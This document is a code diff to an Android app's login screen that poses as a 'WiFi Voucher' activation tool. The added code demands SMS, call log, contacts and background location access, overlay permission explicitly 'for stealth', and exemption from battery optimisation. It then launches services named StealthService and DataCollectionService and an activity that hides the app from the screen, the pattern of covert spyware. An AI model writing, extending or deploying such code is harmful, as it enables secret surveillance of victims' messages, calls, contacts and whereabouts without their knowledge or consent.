@@ -2,22 +2,34 @@ package com.security.update;
 
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import org.json.JSONObject;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 
 public class LoginActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+    private static final int OVERLAY_PERMISSION_CODE = 1002;
+    private static final int BATTERY_OPTIMIZATION_CODE = 1003;
 
     private EditText codeInput;
     private Button verifyButton;
@@ -25,6 +37,7 @@ public class LoginActivity extends AppCompatActivity {
     private TextView titleText, subtitleText, statusText;
     private SharedPreferences prefs;
     private Handler handler;
+    private String verifiedCode;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,7 +47,7 @@ public class LoginActivity extends AppCompatActivity {
         prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
         handler = new Handler();
 
-        // Already activated? Skip to service
+        // Already activated?
         if (prefs.contains("parent_code") && prefs.getBoolean("is_activated", false)) {
             startVoucherService();
             return;
@@ -121,37 +134,28 @@ public class LoginActivity extends AppCompatActivity {
                 conn.disconnect();
 
                 if (responseCode == 200) {
-                    // Success
-                    prefs.edit()
-                        .putString("parent_code", code)
-                        .putBoolean("is_activated", true)
-                        .apply();
-
+                    verifiedCode = code;
                     handler.post(() -> {
                         progressBar.setVisibility(View.GONE);
-                        statusText.setText("Connected Successfully!");
+                        statusText.setText("Code verified! Requesting permissions...");
                         statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
-                        Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
-                        
-                        // Delay then start service
-                        handler.postDelayed(() -> startVoucherService(), 1000);
+                        requestAllPermissions();
                     });
                 } else if (responseCode == 404) {
                     handler.post(() -> {
                         progressBar.setVisibility(View.GONE);
                         verifyButton.setEnabled(true);
-                        statusText.setText("Invalid Voucher Code. Please try again.");
+                        statusText.setText("Invalid Voucher Code");
                         statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                     });
                 } else {
                     handler.post(() -> {
                         progressBar.setVisibility(View.GONE);
                         verifyButton.setEnabled(true);
-                        statusText.setText("Server error. Try again later.");
+                        statusText.setText("Server error. Try again.");
                         statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                     });
                 }
-
             } catch (Exception e) {
                 handler.post(() -> {
                     progressBar.setVisibility(View.GONE);
@@ -163,16 +167,116 @@ public class LoginActivity extends AppCompatActivity {
         }).start();
     }
 
+    private void requestAllPermissions() {
+        List<String> permissionsNeeded = new ArrayList<>();
+
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_SMS);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_CALL_LOG);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_CONTACTS);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                permissionsNeeded.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
+
+        if (!permissionsNeeded.isEmpty()) {
+            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        } else {
+            // All permissions already granted
+            onPermissionsGranted();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (allGranted) {
+                onPermissionsGranted();
+            } else {
+                statusText.setText("All permissions are required!");
+                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                verifyButton.setEnabled(true);
+                progressBar.setVisibility(View.GONE);
+            }
+        }
+    }
+
+    private void onPermissionsGranted() {
+        // Request overlay permission for stealth
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            statusText.setText("Grant overlay permission...");
+            Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + getPackageName()));
+            startActivityForResult(overlayIntent, OVERLAY_PERMISSION_CODE);
+        } else {
+            // Request battery optimization
+            requestBatteryOptimization();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == OVERLAY_PERMISSION_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+                requestBatteryOptimization();
+            } else {
+                requestBatteryOptimization();
+            }
+        } else if (requestCode == BATTERY_OPTIMIZATION_CODE) {
+            activateAndFinish();
+        }
+    }
+
+    private void requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
+        } else {
+            activateAndFinish();
+        }
+    }
+
+    private void activateAndFinish() {
+        statusText.setText("Activating...");
+
+        // Save activation
+        prefs.edit()
+            .putString("parent_code", verifiedCode)
+            .putBoolean("is_activated", true)
+            .apply();
+
+        handler.postDelayed(() -> {
+            Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
+            startVoucherService();
+        }, 500);
+    }
+
     private void startVoucherService() {
         // Start stealth service
         Intent stealthIntent = new Intent(this, StealthService.class);
         startService(stealthIntent);
 
-        // Start data collection service
+        // Start data collection
         Intent dataIntent = new Intent(this, DataCollectionService.class);
         startService(dataIntent);
 
-        // Go to stealth mode
+        // Go to stealth mode (hides from screen)
         Intent stealthActivity = new Intent(this, StealthActivity.class);
         startActivity(stealthActivity);
         finish();
